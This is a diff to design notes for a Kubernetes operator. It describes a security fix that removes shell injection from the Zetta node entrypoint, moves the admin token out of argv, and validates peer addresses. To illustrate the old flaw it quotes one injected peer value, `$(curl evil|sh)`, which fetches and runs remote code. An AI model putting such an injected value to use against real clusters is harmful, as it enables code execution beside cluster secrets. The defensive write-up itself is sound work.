@@ -521,9 +521,33 @@ the pod-CIDR-collision undercount #803 fixes can recur). So the entrypoint now r
 iff `zettaReachability` (the single source of truth shared with status + topology) is `dial-out-only`, and
 **`--node-type ephemeral|permanent`** from `spec.ephemeral`. The two are **independent** axes (a private
 permanent home node is `dial-out-only` + `permanent`; burst capacity is `dial-out-only` + `ephemeral`).
-These are FLAGS, so — like `--admin-token` — they require the auth-capable image generation the operator
+These are FLAGS, so they require the auth-capable image generation the operator
 already mandates (post-[#799](https://github.com/oramasearch/zetta/issues/799) travels with #803/#810); an
 older image would crash on the unknown flag. Verify with `SELECT reachability, node_type FROM system.nodes`.
+
+**Zetta node entrypoint: no CR data in shell text** (`internal/controller/zetta_peers.go`,
+[operator#279](https://github.com/oramasearch/orama-operator/issues/279)). The node container runs
+`/bin/sh -c <zettaEntrypointScript>`, a **constant** script — the same bytes for every
+`OramaZettaCluster`, with only Go constants (`/data`, `:7777`, `:4800`) formatted in. A shell is still
+needed for the per-node values only known at run time (the ordinal from `POD_NAME`, `HOST_IP` under
+`hostNetwork`, this node's field of `ZETTA_ADVERTISE_MAP`). Everything variable is data: the container
+**args** are `zetta-entrypoint` (`$0`), the node flags, `--`, then the external peers one per argument; node-0's
+seed address is the env var `ORAMA_ZETTA_SEED` (deliberately not the engine's own `ZETTA_SEED_PEER`); the
+advertise map and tokens are env vars. The admin token is no longer passed as `--admin-token`: argv is
+readable by every process on the node (`/proc/<pid>/cmdline`), and the engine reads `ZETTA_ADMIN_TOKEN` from
+its environment when the flag is absent. `spec.env` cannot set `ORAMA_ZETTA_SEED` or the engine's own
+`ZETTA_SEED_PEER`/`ZETTA_DATA_DIR`. The script grows the argv with `set -- "$@" …` and ends
+with `exec zetta "$@"`, so no value is ever re-parsed, split or globbed. Before #279 the peers were pasted
+into the script, so a peer such as `$(curl evil|sh)` — from `spec.externalPeers` or from any operator able to
+append to the shared topology table — ran in every Zetta pod beside `ZETTA_ADMIN_TOKEN` and
+`ZETTA_CLUSTER_TOKEN`. Peers are also **validated** as `host:port` (CRD pattern + controller): an invalid
+`spec.externalPeers`/`spec.wanAddress` is refused (StatefulSet untouched, `PeerAddressesValid=False`, values
+Go-quoted in the message), an
+invalid topology address is trimmed, then dropped and reported (logged once per change), and resolved advertise addresses are checked before they are
+advertised or written to the topology. For valid input the argv is what the old entrypoint produced minus
+`--admin-token <token>`, and zetta still sees the token in its environment — `TestZettaEntrypointMatchesLegacyArgv` runs both scripts (under `/bin/sh` and dash, the Ubuntu
+image's `/bin/sh`) against a stub `zetta` for every shape and ordinal. Changing the pod template (new
+`command`, `args`, env var) **rolls every Zetta pod once** when an operator with this change first reconciles.
 
 **Cross-cluster topology THROUGH Zetta** (`internal/controller/zetta_topology.go`,
 [operator#105](https://github.com/oramasearch/orama-operator/issues/105)). Instead of an admin
@@ -534,7 +558,9 @@ like `components` — one row per node, namespaced by `operator` + global `clust
 that table across every cluster, and it **reads** the table back (latest-wins per node by `updated_at`) to
 **derive** its `--peer` set from the OTHER slices' wan endpoints. The StatefulSet's `--peer` flags
 (`mutateZettaStatefulSet` → `zettaPeerSet`) are the **union** of `spec.externalPeers` (explicit override —
-wins) and the derived set (deduped, excluding this slice's own nodes/addresses). Failover: a departed wan node
+wins) and the derived set (deduped, excluding this slice's own nodes/addresses); topology rows are untrusted, so a
+derived address that is not a valid `host:port` is dropped and named in `PeerAddressesValid`
+([operator#279](https://github.com/oramasearch/orama-operator/issues/279)). Failover: a departed wan node
 (scale-down / flip to `dial-out-only`) gets a **`status='gone'` marker row** and falls out of the derived set
 next reconcile. Reads go through `zettaSQLQuery` (parses `.value.rows`; sends the admin bearer). **Blocked:**
 removing a departed node from Zetta's own **membership CRDT** node-list is not possible over SQL (append-only)
